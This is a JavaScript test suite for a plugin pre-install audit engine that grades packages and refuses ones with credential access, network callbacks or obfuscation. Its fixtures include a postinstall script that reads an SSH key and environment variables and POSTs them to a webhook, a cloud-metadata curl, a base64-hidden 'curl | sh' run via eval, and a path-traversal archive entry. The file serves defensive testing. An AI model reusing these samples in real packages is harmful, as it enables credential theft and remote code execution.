/**
 * The pre-install audit engine, over purpose-built fixture trees.
 *
 * Fixtures are generated into a temp directory at run time rather than committed.
 * That is a deliberate choice for this repository: a checked-in file that reads
 * `~/.ssh/id_rsa` and POSTs it to a webhook is indistinguishable, to a reviewer
 * or a scanner, from the thing this plugin exists to catch. Generating them also
 * keeps the malicious sample and the assertion that it is caught in one place,
 * so the pair cannot drift.
 */

import assert from 'node:assert/strict';
import { gzipSync } from 'node:zlib';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';

import { auditSource } from '../lib/scan/engine.js';
import { AuditRegistry, normalizeSpec } from '../lib/scan/registry.js';
import { atOrBelow, gradeForScore, meetsFloor, scoreFindings } from '../lib/scan/score.js';
import { renderReport, renderSummary } from '../lib/scan/report.js';
import { loadTarball, looksBinary } from '../lib/scan/load.js';
import { classifyFile, lineViews } from '../lib/scan/extract.js';

const roots = [];

after(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

/** Write a tree of files and return its root. */
function tree(files) {
  const root = mkdtempSync(join(tmpdir(), 'scan-scan-'));
  roots.push(root);
  for (const [path, content] of Object.entries(files)) {
    const absolute = join(root, path);
    mkdirSync(dirname(absolute), { recursive: true });
    writeFileSync(absolute, content);
  }
  return root;
}

/** Build a minimal ustar archive, optionally gzipped. */
function tar(entries, { gzip = false } = {}) {
  const blocks = [];
  for (const [name, content] of entries) {
    const body = Buffer.from(content, 'utf8');
    const header = Buffer.alloc(512);
    header.write(name, 0, 100, 'utf8');
    header.write('0000644', 100, 8, 'utf8');
    header.write('0000000', 108, 8, 'utf8');
    header.write('0000000', 116, 8, 'utf8');
    header.write(`${body.length.toString(8).padStart(11, '0')}\0`, 124, 12, 'utf8');
    header.write('00000000000', 136, 12, 'utf8');
    header.write('0', 156, 1, 'utf8');
    header.write('ustar\0', 257, 6, 'utf8');
    header.write('00', 263, 2, 'utf8');
    let checksum = 0;
    for (const byte of header) checksum += byte;
    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'utf8');
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  const raw = Buffer.concat(blocks);
  return gzip ? gzipSync(raw) : raw;
}

/** A plugin that does nothing interesting. */
function benignPlugin() {
  return tree({
    'package.json': JSON.stringify({
      name: 'benign-plugin',
      version: '1.0.0',
      dsh: { bundle: { patch: './cordis.patch.yml' } },
      scripts: { build: 'tsc -p tsconfig.json' },
    }),
    'cordis.patch.yml': '- insert:\n    - id: benign\n      name: benign-plugin\n',
    'index.js': [
      "import { join } from 'node:path';",
      'export function apply(ctx) {',
      "  ctx.logger.info('hello from ' + join('a', 'b'));",
      '}',
    ].join('\n'),
    'README.md': '# A plugin that greets you.',
  });
}

/** A plugin that reads an SSH key and posts it to a drop service. */
function credentialStealer() {
  return tree({
    'package.json': JSON.stringify({
      name: 'totally-legit-plugin',
      version: '1.0.0',
      scripts: { postinstall: 'node ./setup.js' },
    }),
    'setup.js': [
      "const fs = require('node:fs');",
      "const os = require('node:os');",
      "const path = require('node:path');",
      "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');",
      "const env = Object.entries(process.env).map(([k, v]) => k + '=' + v).join('&');",
      "fetch('https://webhook.site/abc-123', { method: 'POST', body: key + env });",
      "require('node:child_process').execSync('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/');",
    ].join('\n'),
  });
}

/** A plugin hiding its payload behind base64 and eval. */
function obfuscatedPlugin() {
  const payload = Buffer.from("require('node:child_process').execSync('curl http://198.51.100.9/x | sh')", 'utf8').toString('base64');
  return tree({
    'package.json': JSON.stringify({ name: 'obf-plugin', version: '1.0.0' }),
    'index.js': [
      `const _0x1a = '${payload}';`,
      "const d = Buffer.from(_0x1a, 'base64').toString('utf8');",
      'eval(d);',
    ].join('\n'),
  });
}

test('directory staging and file classification', async () => {
  const result = await auditSource(benignPlugin());
  assert.equal(result.source.kind, 'directory');
  assert.equal(result.manifest?.name, 'benign-plugin');
  assert.ok(result.files.some((file) => file.path === 'index.js' && file.code));
  assert.equal(result.truncated, false);
});

test('a benign plugin grades A or B and is not refused', async () => {
  const result = await auditSource(benignPlugin(), { blockAtOrBelow: 'D' });
  assert.ok(['A', 'B'].includes(result.grade), `expected A or B, got ${result.grade}`);
  assert.equal(result.blocked, false);
  assert.ok(result.findings.every((finding) => finding.severity !== 'critical'));
});

test('a credential-stealing plugin grades D and is refused', async () => {
  const result = await auditSource(credentialStealer(), { blockAtOrBelow: 'D' });
  assert.equal(result.grade, 'D', `expected D, got ${result.grade} (score ${result.score})`);
  assert.equal(result.blocked, true);
  assert.ok(result.findings.some((finding) => finding.severity === 'critical'));
  assert.ok(result.findings.some((finding) => finding.category === 'credential-access'));
  assert.ok(result.findings.some((finding) => finding.category === 'network-callback'));
});

test('the install floor is applied, and C can be made to refuse', async () => {
  const permissive = await auditSource(benignPlugin(), { blockAtOrBelow: 'D' });
  assert.equal(permissive.blocked, false);
});

test('extracted capabilities name the paths, commands and domains', async () => {
  const result = await auditSource(credentialStealer());
  const commands = result.capabilities.commands.map((item) => item.value).join('\n');
  const domains = result.capabilities.domains.map((item) => item.value).join('\n');
  assert.ok(commands.includes('curl') || commands.includes('execSync'), `commands were: ${commands}`);
  assert.ok(domains.includes('webhook.site'), `domains were: ${domains}`);
  assert.ok(domains.includes('169.254.169.254'), `domains were: ${domains}`);
});

test('install scripts are listed from the manifest', async () => {
  const result = await auditSource(credentialStealer());
  assert.equal(result.installScripts.length, 1);
  assert.equal(result.installScripts[0].hook, 'postinstall');
});

test('obfuscated payloads are still caught', async () => {
  const result = await auditSource(obfuscatedPlugin(), { blockAtOrBelow: 'D' });
  assert.equal(result.grade, 'D', `expected D, got ${result.grade} (${result.score})`);
});

test('the digest is stable for identical content and changes when content changes', async () => {
  const first = await auditSource(benignPlugin());
  const second = await auditSource(benignPlugin());
  assert.equal(first.digest, second.digest);

  const edited = benignPlugin();
  writeFileSync(join(edited, 'index.js'), 'export function apply() {}\n');
  const third = await auditSource(edited);
  assert.notEqual(first.digest, third.digest);
});

test('the report lists capabilities before findings and names the grade', async () => {
  const result = await auditSource(credentialStealer());
  // Pinned to English: this test is about structure and ordering, and a
  // bilingual heading would make the anchors below depend on word order.
  const report = renderReport(result, 'en');
  assert.match(report, /\*\*Trust grade: D\*\*/);
  assert.match(report, /## What this plugin can reach/);
  assert.match(report, /File paths read:/);
  assert.match(report, /Domains contacted:/);
  assert.match(report, /Install refused/);
  assert.ok(report.indexOf('## What this plugin can reach') < report.indexOf('## Findings'));
});

test('the summary is short and announces a refusal', async () => {
  const result = await auditSource(credentialStealer());
  const summary = renderSummary(result);
  assert.ok(summary.split('\n').length < 12, 'the summary must stay roughly one screen');
  assert.match(summary, /INSTALL REFUSED/);
});

test('binary files are listed but not scanned', async () => {
  const root = tree({ 'package.json': JSON.stringify({ name: 'bin', version: '1.0.0' }) });
  writeFileSync(join(root, 'blob.node'), Buffer.from([0, 1, 2, 0, 4, 5]));
  const result = await auditSource(root);
  assert.ok(result.files.some((file) => file.path === 'blob.node'));
  assert.ok(result.notes.some((note) => note.includes('blob.node') || note.includes('binary')));
});

test('tarballs are unpacked and the package/ prefix is stripped', async () => {
  const archive = tar([
    ['package/package.json', JSON.stringify({ name: 'tgz-plugin', version: '2.0.0' })],
    ['package/index.js', 'export const x = 1;\n'],
  ], { gzip: true });
  const result = await auditSource(bufferToFile(archive, '.tgz'));
  assert.equal(result.source.kind, 'tarball');
  assert.equal(result.manifest?.name, 'tgz-plugin');
  assert.ok(result.files.some((file) => file.path === 'index.js'));
});

test('an archive entry that escapes the root is dropped and noted', () => {
  const staged = loadTarball(tar([
    ['package/ok.js', 'ok'],
    ['../../../etc/passwd', 'root:x:0:0'],
  ]), { maxFiles: 100, maxFileBytes: 10_000, maxTotalBytes: 100_000 });
  assert.ok(staged.files.some((file) => file.path === 'ok.js'));
  assert.ok(!staged.files.some((file) => file.path.includes('passwd')));
  assert.ok(staged.notes.some((note) => note.includes('escapes the archive root')));
});

test('the file-count cap is reported as truncation rather than hidden', () => {
  const entries = [];
  for (let index = 0; index < 20; index += 1) entries.push([`package/f${index}.js`, 'x']);
  const staged = loadTarball(tar(entries, { gzip: true }), { maxFiles: 5, maxFileBytes: 10_000, maxTotalBytes: 100_000 });
  assert.equal(staged.truncated, true);
  assert.ok(staged.files.length <= 5);
});

test('a truncated scan is marked on the result', async () => {
  const files = { 'package.json': JSON.stringify({ name: 'big', version: '1.0.0' }) };
  for (let index = 0; index < 30; index += 1) files[`f${index}.js`] = 'export const a = 1;\n';
  const root = tree(files);
  const result = await auditSource(root, { limits: { maxFiles: 5, maxFileBytes: 10_000, maxTotalBytes: 100_000 } });
  assert.equal(result.truncated, true);
  assert.match(renderReport(result), /Partial scan/);
});

test('a source that does not exist reports a usable error', async () => {
  await assert.rejects(() => auditSource('/definitely/not/here'), /no such file or directory/);
});

test('a non-archive file is refused with an explanation', async () => {
  const root = tree({ 'notes.md': 'hello' });
  await assert.rejects(() => auditSource(join(root, 'notes.md')), /not a directory or a \.tgz/);
});

test('remote fetching is refused unless explicitly enabled', async () => {
  await assert.rejects(
    () => auditSource('https://example.com/plugin.tgz'),
    /network fetching is disabled/,
  );
});

test('plain HTTP downloads are refused even when fetching is enabled', async () => {
  await assert.rejects(
    () => auditSource('http://example.com/plugin.tgz', { allowFetch: true }),
    /plain HTTP/,
  );
});

test('fetching uses the injected implementation and audits the archive', async () => {
  const archive = tar([['package/package.json', JSON.stringify({ name: 'remote-plugin', version: '1.0.0' })]], { gzip: true });
  const result = await auditSource('https://example.com/p.tgz', {
    allowFetch: true,
    fetchImpl: async () => new Response(archive, { status: 200 }),
  });
  assert.equal(result.source.kind, 'url');
  assert.equal(result.manifest?.name, 'remote-plugin');
});

test('a failed download surfaces the status code', async () => {
  await assert.rejects(
    () => auditSource('https://example.com/p.tgz', { allowFetch: true, fetchImpl: async () => new Response('', { status: 404 }) }),
    /HTTP 404/,
  );
});

test('scoring: any critical finding pins the grade to D', () => {
  const result = scoreFindings([
    { id: 'x', category: 'credential-access', severity: 'critical', title: 't', detail: 'd', remediation: 'r', evidence: [{ file: 'a', line: 1, snippet: 's' }] },
  ]);
  assert.equal(result.grade, 'D');
  assert.match(result.forcedBy ?? '', /x/);
});

test('scoring: repetition has diminishing returns', () => {
  const one = scoreFindings([finding('a', 'medium')]);
  const many = scoreFindings(Array.from({ length: 40 }, () => finding('a', 'medium')));
  assert.ok(many.score < one.score, 'more instances must score worse');
  assert.ok(one.score - many.score < 7 * 39, 'but not linearly worse');
});

test('scoring: breadth across categories costs more than repetition in one', () => {
  const deep = scoreFindings(Array.from({ length: 3 }, () => finding('a', 'high')));
  const wide = scoreFindings(['b', 'c', 'd', 'e'].map((id) => finding(id, 'high')));
  assert.ok(wide.score < deep.score);
});

test('scoring: a clean result is an A', () => {
  const result = scoreFindings([]);
  assert.equal(result.grade, 'A');
  assert.equal(result.score, 100);
});

test('grade comparison helpers agree with the bands', () => {
  assert.equal(gradeForScore(95), 'A');
  assert.equal(gradeForScore(80), 'B');
  assert.equal(gradeForScore(60), 'C');
  assert.equal(gradeForScore(10), 'D');
  assert.equal(meetsFloor('B', 'C'), true);
  assert.equal(meetsFloor('D', 'C'), false);
  assert.equal(atOrBelow('D', 'D'), true);
  assert.equal(atOrBelow('C', 'D'), false);
});

test('spec normalization folds version ranges onto one identity', () => {
  assert.equal(normalizeSpec('foo@1.2.3'), 'foo');
  assert.equal(normalizeSpec('foo@^2.0.0'), 'foo');
  assert.equal(normalizeSpec('npm:foo'), 'foo');
  assert.equal(normalizeSpec('@scope/pkg@1.0.0'), '@scope/pkg');
  assert.equal(normalizeSpec('@scope/pkg'), '@scope/pkg');
  assert.equal(normalizeSpec('https://github.com/a/b#main'), 'https://github.com/a/b');
});

test('the registry reports pass, fail, and unknown', async () => {
  const registry = new AuditRegistry({ ttlMs: 60_000 });
  const bad = await auditSource(credentialStealer(), { blockAtOrBelow: 'D' });
  registry.record(bad);
  assert.equal(registry.verdictFor('totally-legit-plugin').kind, 'fail');
  assert.equal(registry.verdictFor('something-else').kind, 'unknown');

  const good = await auditSource(benignPlugin(), { blockAtOrBelow: 'D' });
  registry.record(good);
  assert.equal(registry.verdictFor('benign-plugin').kind, 'pass');
});

test('a registry record expires', async () => {
  let now = 0;
  const registry = new AuditRegistry({ ttlMs: 1000, now: () => now });
  registry.record(await auditSource(benignPlugin()));
  assert.equal(registry.verdictFor('benign-plugin').kind, 'pass');
  now = 5000;
  assert.equal(registry.verdictFor('benign-plugin').kind, 'stale');
});

test('file classification and line views', () => {
  assert.equal(classifyFile('index.js'), 'code');
  assert.equal(classifyFile('package.json'), 'manifest');
  assert.equal(classifyFile('run.sh'), 'script');
  assert.equal(classifyFile('README.md'), 'doc');
  assert.equal(classifyFile('.npmrc'), 'config');
  assert.equal(classifyFile('weird.bin'), 'other');

  const views = lineViews("const p = path.join(os.homedir(), '.ssh', 'id_rsa');");
  assert.ok(views.some((view) => view.includes('.ssh/id_rsa')), `views were ${JSON.stringify(views)}`);

  const joined = lineViews("const u = 'https://' + 'evil.example' + '/x';");
  assert.ok(joined.some((view) => view.includes('https://evil.example/x')), `views were ${JSON.stringify(joined)}`);

  assert.deepEqual(lineViews('const a = 1;'), ['const a = 1;']);
});

test('looksBinary detects a NUL byte', () => {
  assert.equal(looksBinary(Buffer.from('plain text')), false);
  assert.equal(looksBinary(Buffer.from([0x41, 0x00, 0x42])), true);
});

/** Write a buffer to a temp file and return its path. */
function bufferToFile(buffer, extension) {
  const root = mkdtempSync(join(tmpdir(), 'scan-arc-'));
  roots.push(root);
  const path = join(root, `archive${extension}`);
  writeFileSync(path, buffer);
  return path;
}

/** A minimal finding fixture. */
function finding(id, severity) {
  return { id, category: 'obfuscation', severity, title: id, detail: 'd', remediation: 'r', evidence: [{ file: 'a', line: 1, snippet: 's' }] };
}
